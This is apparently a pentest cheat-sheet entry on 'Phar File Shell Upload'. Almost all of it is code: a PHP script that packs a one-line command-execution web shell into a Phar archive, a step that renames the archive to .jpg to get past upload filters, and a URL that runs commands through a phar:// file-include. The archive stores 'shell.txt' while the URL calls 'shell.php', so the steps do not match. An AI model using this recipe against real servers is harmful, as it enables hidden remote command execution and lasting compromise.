# Phar File Shell Upload

OS: PHP, Web
Description: Upload Phar File and reference it
Security Domains: Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)

### PHAR

- Create Phar

```jsx
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

- Then Compile

```jsx
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

- Upload and call

```jsx
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.php&cmd=id
```